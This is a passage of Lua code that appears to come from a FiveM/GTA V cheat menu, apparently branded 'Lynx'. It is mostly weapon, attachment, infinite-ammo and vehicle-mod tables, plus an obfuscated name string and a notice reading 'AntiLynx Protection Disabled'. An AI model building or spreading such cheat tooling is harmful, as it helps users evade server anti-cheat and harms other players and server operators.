                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                },
                Grips = {
                    {name = '~h~~r~> ~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP'}
                }
            }
        },
        SpecialCarbineMkII = {
            id = 'weapon_specialcarbine_mk2',
            name = '~h~~r~> ~s~Special Carbine Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Tracer Rounds',
                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~r~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~r~> ~s~Hollow Point Rounds',
                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~r~> ~s~FMJ Rounds',
                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~r~> ~s~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
                    },
                    {
                        name = '~h~~r~> ~s~Large Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~r~> ~s~Default',
                        id = 'COMPONENT_AT_SC_BARREL_01'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy',
                        id = 'COMPONENT_AT_SC_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~r~> ~s~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~r~> ~s~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~r~> ~s~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~r~> ~s~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~r~> ~s~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                },
                Grips = {
                    {name = '~h~~r~> ~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP_02'}
                }
            }
        },
        BullpupRifle = {
            id = 'weapon_bullpuprifle',
            name = '~h~~r~> ~s~Bullpup Rifle',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_BULLPUPRIFLE_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_BULLPUPRIFLE_CLIP_02'
                    }
                },
                Sights = {
                    {name = '~h~~r~> ~s~Scope', id = 'COMPONENT_AT_SCOPE_SMALL'}
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    }
                },
                Grips = {
                    {name = '~h~~r~> ~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP'}
                }
            }
        },
        BullpupRifleMkII = {
            id = 'weapon_bullpuprifle_mk2',
            name = '~h~~r~> ~s~Bullpup Rifle Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Tracer Rounds',
                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~r~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~r~> ~s~Armor Piercing Rounds',
                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~r~> ~s~FMJ Rounds',
                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~r~> ~s~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_02_MK2'
                    },
                    {
                        name = '~h~~r~> ~s~Medium Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~r~> ~s~Default',
                        id = 'COMPONENT_AT_BP_BARREL_01'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy',
                        id = 'COMPONENT_AT_BP_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    },
                    {
                        name = '~h~~r~> ~s~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~r~> ~s~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~r~> ~s~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~r~> ~s~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~r~> ~s~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~r~> ~s~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                },
                Grips = {
                    {name = '~h~~r~> ~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP'}
                }
            }
        },
        CompactRifle = {
            id = 'weapon_compactrifle',
            name = '~h~~r~> ~s~Compact Rifle',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_COMPACTRIFLE_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_COMPACTRIFLE_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Drum Magazine',
                        id = 'COMPONENT_COMPACTRIFLE_CLIP_03'
                    }
                }
            }
        }
    },
    LMG = {
        MG = {
            id = 'weapon_mg',
            name = '~h~~r~> ~s~MG',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_MG_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_MG_CLIP_02'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL_02'
                    }
                }
            }
        },
        CombatMG = {
            id = 'weapon_combatmg',
            name = '~h~~r~> ~s~Combat MG',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_COMBATMG_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_COMBATMG_CLIP_02'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM'
                    }
                },
                Grips = {
                    {name = '~h~~r~> ~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP'}
                }
            }
        },
        CombatMGMkII = {
            id = 'weapon_combatmg_mk2',
            name = '~h~~r~> ~s~Combat MG Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_COMBATMG_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_COMBATMG_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Tracer Rounds',
                        id = 'COMPONENT_COMBATMG_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~r~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_COMBATMG_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~r~> ~s~Hollow Point Rounds',
                        id = 'COMPONENT_COMBATMG_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~r~> ~s~FMJ Rounds',
                        id = 'COMPONENT_COMBATMG_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~r~> ~s~Medium Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL_MK2'
                    },
                    {
                        name = '~h~~r~> ~s~Large Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~r~> ~s~Default',
                        id = 'COMPONENT_AT_MG_BARREL_01'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy',
                        id = 'COMPONENT_AT_MG_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~r~> ~s~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~r~> ~s~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~r~> ~s~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~r~> ~s~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~r~> ~s~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                },
                Grips = {
                    {name = '~h~~r~> ~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP_02'}
                }
            }
        },
        GusenbergSweeper = {
            id = 'weapon_gusenberg',
            name = '~h~~r~> ~s~GusenbergSweeper',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_GUSENBERG_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_GUSENBERG_CLIP_02'
                    }
                }
            }
        }
    },
    Snipers = {
        SniperRifle = {
            id = 'weapon_sniperrifle',
            name = '~h~~r~> ~s~Sniper Rifle',
            bInfAmmo = false,
            mods = {
                Sights = {
                    {name = '~h~~r~> ~s~Scope', id = 'COMPONENT_AT_SCOPE_LARGE'},
                    {
                        name = '~h~~r~> ~s~Advanced Scope',
                        id = 'COMPONENT_AT_SCOPE_MAX'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                }
            }
        },
        HeavySniper = {
            id = 'weapon_heavysniper',
            name = '~h~~r~> ~s~Heavy Sniper',
            bInfAmmo = false,
            mods = {
                Sights = {
                    {name = '~h~~r~> ~s~Scope', id = 'COMPONENT_AT_SCOPE_LARGE'},
                    {
                        name = '~h~~r~> ~s~Advanced Scope',
                        id = 'COMPONENT_AT_SCOPE_MAX'
                    }
                }
            }
        },
        HeavySniperMkII = {
            id = 'weapon_heavysniper_mk2',
            name = '~h~~r~> ~s~Heavy Sniper Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~r~> ~s~Armor Piercing Rounds',
                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~r~> ~s~FMJ Rounds',
                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_FMJ'
                    },
                    {
                        name = '~h~~r~> ~s~Explosive Rounds',
                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_EXPLOSIVE'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Zoom Scope',
                        id = 'COMPONENT_AT_SCOPE_LARGE_MK2'
                    },
                    {
                        name = '~h~~r~> ~s~Advanced Scope',
                        id = 'COMPONENT_AT_SCOPE_MAX'
                    },
                    {
                        name = '~h~~r~> ~s~Nigt Vision Scope',
                        id = 'COMPONENT_AT_SCOPE_NV'
                    },
                    {
                        name = '~h~~r~> ~s~Thermal Scope',
                        id = 'COMPONENT_AT_SCOPE_THERMAL'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~r~> ~s~Default',
                        id = 'COMPONENT_AT_SR_BARREL_01'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy',
                        id = 'COMPONENT_AT_SR_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_SR_SUPP_03'
                    },
                    {
                        name = '~h~~r~> ~s~Squared Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_08'
                    },
                    {
                        name = '~h~~r~> ~s~Bell-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_09'
                    }
                }
            }
        },
        MarksmanRifle = {
            id = 'weapon_marksmanrifle',
            name = '~h~~r~> ~s~Marksman Rifle',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_MARKSMANRIFLE_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_MARKSMANRIFLE_CLIP_02'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    }
                },
                Grips = {
                    {name = '~h~~r~> ~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP'}
                }
            }
        },
        MarksmanRifleMkII = {
            id = 'weapon_marksmanrifle_mk2',
            name = '~h~~r~> ~s~Marksman Rifle Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Tracer Rounds',
                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~r~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~r~> ~s~Hollow Point Rounds',
                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~r~> ~s~FMJ Rounds',
                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_FMJ	'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~r~> ~s~Large Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
                    },
                    {
                        name = '~h~~r~> ~s~Zoom Scope',
                        id = 'COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~r~> ~s~Default',
                        id = 'COMPONENT_AT_MRFL_BARREL_01'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy',
                        id = 'COMPONENT_AT_MRFL_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    },
                    {
                        name = '~h~~r~> ~s~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~r~> ~s~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~r~> ~s~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~r~> ~s~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~r~> ~s~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~r~> ~s~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                },
                Grips = {
                    {name = '~h~~r~> ~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP_02'}
                }
            }
        }
    },
    Heavy = {
        RPG = {
            id = 'weapon_rpg',
            name = '~h~~r~> ~s~RPG',
            bInfAmmo = false,
            mods = {}
        },
        GrenadeLauncher = {
            id = 'weapon_grenadelauncher',
            name = '~h~~r~> ~s~Grenade Launcher',
            bInfAmmo = false,
            mods = {}
        },
        GrenadeLauncherSmoke = {
            id = 'weapon_grenadelauncher_smoke',
            name = '~h~~r~> ~s~Grenade Launcher Smoke',
            bInfAmmo = false,
            mods = {}
        },
        Minigun = {
            id = 'weapon_minigun',
            name = '~h~~r~> ~s~Minigun',
            bInfAmmo = false,
            mods = {}
        },
        FireworkLauncher = {
            id = 'weapon_firework',
            name = '~h~~r~> ~s~Firework Launcher',
            bInfAmmo = false,
            mods = {}
        },
        Railgun = {
            id = 'weapon_railgun',
            name = '~h~~r~> ~s~Railgun',
            bInfAmmo = false,
            mods = {}
        },
        HomingLauncher = {
            id = 'weapon_hominglauncher',
            name = '~h~~r~> ~s~Homing Launcher',
            bInfAmmo = false,
            mods = {}
        },
        CompactGrenadeLauncher = {
            id = 'weapon_compactlauncher',
            name = '~h~~r~> ~s~Compact Grenade Launcher',
            bInfAmmo = false,
            mods = {}
        },
        Widowmaker = {
            id = 'weapon_rayminigun',
            name = '~h~~r~> ~s~Widowmaker',
            bInfAmmo = false,
            mods = {}
        }
    },
    Throwables = {
        Grenade = {
            id = 'weapon_grenade',
            name = '~h~~r~> ~s~Grenade',
            bInfAmmo = false,
            mods = {}
        },
        BZGas = {
            id = 'weapon_bzgas',
            name = '~h~~r~> ~s~BZ Gas',
            bInfAmmo = false,
            mods = {}
        },
        MolotovCocktail = {
            id = 'weapon_molotov',
            name = '~h~~r~> ~s~Molotov Cocktail',
            bInfAmmo = false,
            mods = {}
        },
        StickyBomb = {
            id = 'weapon_stickybomb',
            name = '~h~~r~> ~s~Sticky Bomb',
            bInfAmmo = false,
            mods = {}
        },
        ProximityMines = {
            id = 'weapon_proxmine',
            name = '~h~~r~> ~s~Proximity Mines',
            bInfAmmo = false,
            mods = {}
        },
        Snowballs = {
            id = 'weapon_snowball',
            name = '~h~~r~> ~s~Snowballs',
            bInfAmmo = false,
            mods = {}
        },
        PipeBombs = {
            id = 'weapon_pipebomb',
            name = '~h~~r~> ~s~Pipe Bombs',
            bInfAmmo = false,
            mods = {}
        },
        Baseball = {
            id = 'weapon_ball',
            name = '~h~~r~> ~s~Baseball',
            bInfAmmo = false,
            mods = {}
        },
        TearGas = {
            id = 'weapon_smokegrenade',
            name = '~h~~r~> ~s~Tear Gas',
            bInfAmmo = false,
            mods = {}
        },
        Flare = {
            id = 'weapon_flare',
            name = '~h~~r~> ~s~Flare',
            bInfAmmo = false,
            mods = {}
        }
    },
    Misc = {
        Parachute = {
            id = 'gadget_parachute',
            name = '~h~~r~> ~s~Parachute',
            bInfAmmo = false,
            mods = {}
        },
        FireExtinguisher = {
            id = 'weapon_fireextinguisher',
            name = '~h~~r~> ~s~Fire Extinguisher',
            bInfAmmo = false,
            mods = {}
        }
    }
}
local b1 = false
local b2 = false
local b3 = false
local b4 = false
local b5 = nil
local b6 = {}
local b7 = {}
local b8 = nil
local b9 = false
local ba = -1
local bb = -1
local bc = -1
local bd = false
local be = {
    {name = '~h~Spoilers', id = 0},
    {name = '~h~Front Bumper', id = 1},
    {name = '~h~Rear Bumper', id = 2},
    {name = '~h~Side Skirt', id = 3},
    {name = '~h~Exhaust', id = 4},
    {name = '~h~Frame', id = 5},
    {name = '~h~Grille', id = 6},
    {name = '~h~Hood', id = 7},
    {name = '~h~Fender', id = 8},
    {name = '~h~Right Fender', id = 9},
    {name = '~h~Roof', id = 10},
    {name = '~h~Vanity Plates', id = 25},
    {name = '~h~Trim', id = 27},
    {name = '~h~Ornaments', id = 28},
    {name = '~h~Dashboard', id = 29},
    {name = '~h~Dial', id = 30},
    {name = '~h~Door Speaker', id = 31},
    {name = '~h~Seats', id = 32},
    {name = '~h~Steering Wheel', id = 33},
    {name = '~h~Shifter Leavers', id = 34},
    {name = '~h~Plaques', id = 35},
    {name = '~h~Speakers', id = 36},
    {name = '~h~Trunk', id = 37},
    {name = '~h~Hydraulics', id = 38},
    {name = '~h~Engine Block', id = 39},
    {name = '~h~Air Filter', id = 40},
    {name = '~h~Struts', id = 41},
    {name = '~h~Arch Cover', id = 42},
    {name = '~h~Aerials', id = 43},
    {name = '~h~Trim 2', id = 44},
    {name = '~h~Tank', id = 45},
    {name = '~h~Windows', id = 46},
    {name = '~h~Livery', id = 48},
    {name = '~h~Wheels', id = 23},
    {name = '~h~Wheel Types', id = 'wheeltypes'},
    {name = '~h~Extras', id = 'extra'},
    {name = '~h~Neons', id = 'neon'},
    {name = '~h~Paint', id = 'paint'}
}
local bf = {
    {name = '~h~~r~Engine', id = 11},
    {name = '~h~~b~Brakes', id = 12},
    {name = '~h~~g~Transmission', id = 13},
    {name = '~h~~y~Suspension', id = 15}
}
local bg = {
    ['White'] = {255, 255, 255},
    ['Blue'] = {0, 0, 255},
    ['Electric Blue'] = {0, 150, 255},
    ['Mint Green'] = {50, 255, 155},
    ['Lime Green'] = {0, 255, 0},
    ['Yellow'] = {255, 255, 0},
    ['Golden Shower'] = {204, 204, 0},
    ['Orange'] = {255, 128, 0},
    ['Red'] = {255, 0, 0},
    ['Pony Pink'] = {255, 102, 255},
    ['Hot Pink'] = {255, 0, 255},
    ['Purple'] = {153, 0, 153}
}
local bh = {
    {name = '~h~Black', id = 0},
    {name = '~h~Carbon Black', id = 147},
    {name = '~h~Graphite', id = 1},
    {name = '~h~Anhracite Black', id = 11},
    {name = '~h~Black Steel', id = 2},
    {name = '~h~Dark Steel', id = 3},
    {name = '~h~Silver', id = 4},
    {name = '~h~Bluish Silver', id = 5},
    {name = '~h~Rolled Steel', id = 6},
    {name = '~h~Shadow Silver', id = 7},
    {name = '~h~Stone Silver', id = 8},
    {name = '~h~Midnight Silver', id = 9},
    {name = '~h~Cast Iron Silver', id = 10},
    {name = '~h~Red', id = 27},
    {name = '~h~Torino Red', id = 28},
    {name = '~h~Formula Red', id = 29},
    {name = '~h~Lava Red', id = 150},
    {name = '~h~Blaze Red', id = 30},
    {name = '~h~Grace Red', id = 31},
    {name = '~h~Garnet Red', id = 32},
    {name = '~h~Sunset Red', id = 33},
    {name = '~h~Cabernet Red', id = 34},
    {name = '~h~Wine Red', id = 143},
    {name = '~h~Candy Red', id = 35},
    {name = '~h~Hot Pink', id = 135},
    {name = '~h~Pfsiter Pink', id = 137},
    {name = '~h~Salmon Pink', id = 136},
    {name = '~h~Sunrise Orange', id = 36},
    {name = '~h~Orange', id = 38},
    {name = '~h~Bright Orange', id = 138},
    {name = '~h~Gold', id = 99},
    {name = '~h~Bronze', id = 90},
    {name = '~h~Yellow', id = 88},
    {name = '~h~Race Yellow', id = 89},
    {name = '~h~Dew Yellow', id = 91},
    {name = '~h~Dark Green', id = 49},
    {name = '~h~Racing Green', id = 50},
    {name = '~h~Sea Green', id = 51},
    {name = '~h~Olive Green', id = 52},
    {name = '~h~Bright Green', id = 53},
    {name = '~h~Gasoline Green', id = 54},
    {name = '~h~Lime Green', id = 92},
    {name = '~h~Midnight Blue', id = 141},
    {name = '~h~Galaxy Blue', id = 61},
    {name = '~h~Dark Blue', id = 62},
    {name = '~h~Saxon Blue', id = 63},
    {name = '~h~Blue', id = 64},
    {name = '~h~Mariner Blue', id = 65},
    {name = '~h~Harbor Blue', id = 66},
    {name = '~h~Diamond Blue', id = 67},
    {name = '~h~Surf Blue', id = 68},
    {name = '~h~Nautical Blue', id = 69},
    {name = '~h~Racing Blue', id = 73},
    {name = '~h~Ultra Blue', id = 70},
    {name = '~h~Light Blue', id = 74},
    {name = '~h~Chocolate Brown', id = 96},
    {name = '~h~Bison Brown', id = 101},
    {name = '~h~Creeen Brown', id = 95},
    {name = '~h~Feltzer Brown', id = 94},
    {name = '~h~Maple Brown', id = 97},
    {name = '~h~Beechwood Brown', id = 103},
    {name = '~h~Sienna Brown', id = 104},
    {name = '~h~Saddle Brown', id = 98},
    {name = '~h~Moss Brown', id = 100},
    {name = '~h~Woodbeech Brown', id = 102},
    {name = '~h~Straw Brown', id = 99},
    {name = '~h~Sandy Brown', id = 105},
    {name = '~h~Bleached Brown', id = 106},
    {name = '~h~Schafter Purple', id = 71},
    {name = '~h~Spinnaker Purple', id = 72},
    {name = '~h~Midnight Purple', id = 142},
    {name = '~h~Bright Purple', id = 145},
    {name = '~h~Cream', id = 107},
    {name = '~h~Ice White', id = 111},
    {name = '~h~Frost White', id = 112}
}
local bi = '\126\117\126\76\121\110\120\32\126\115\126\79\102\102\105\99\105\97\108'
local bj = {
    {name = '~h~Black', id = 12},
    {name = '~h~Gray', id = 13},
    {name = '~h~Light Gray', id = 14},
    {name = '~h~Ice White', id = 131},
    {name = '~h~Blue', id = 83},
    {name = '~h~Dark Blue', id = 82},
    {name = '~h~Midnight Blue', id = 84},
    {name = '~h~Midnight Purple', id = 149},
    {name = '~h~Schafter Purple', id = 148},
    {name = '~h~Red', id = 39},
    {name = '~h~Dark Red', id = 40},
    {name = '~h~Orange', id = 41},
    {name = '~h~Yellow', id = 42},
    {name = '~h~Lime Green', id = 55},
    {name = '~h~Green', id = 128},
    {name = '~h~Forest Green', id = 151},
    {name = '~h~Foliage Green', id = 155},
    {name = '~h~Olive Darb', id = 152},
    {name = '~h~Dark Earth', id = 153},
    {name = '~h~Desert Tan', id = 154}
}
local bk = {
    {name = '~h~Brushed Steel', id = 117},
    {name = '~h~Brushed Black Steel', id = 118},
    {name = '~h~Brushed Aluminum', id = 119},
    {name = '~h~Pure Gold', id = 158},
    {name = '~h~Brushed Gold', id = 159}
}
defaultVehAction = ''
if GetVehiclePedIsUsing(PlayerPedId()) then
    veh = GetVehiclePedIsUsing(PlayerPedId())
end
local bl = false
local bm = true
local bn = GetPlayerServerId(PlayerPedId(-1))
local bo = GetPlayerName(bn)
drawNotification('~h~AntiLynx Protection Disabled')
local function bp(E, x, y)
    SetTextFont(0)
    SetTextProportional(1)
    SetTextScale(0.0, 0.4)
    SetTextDropshadow(1, 0, 0, 0, 255)
    SetTextEdge(1, 0, 0, 0, 255)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry('STRING')
    AddTextComponentString(E)
    DrawText(x, y)
end

function RequestModelSync(bq)
    local bs = GetHashKey(bq)
    RequestModel(bs)
    while not HasModelLoaded(bs) do
        RequestModel(bs)
        Citizen.Wait(0)
    end
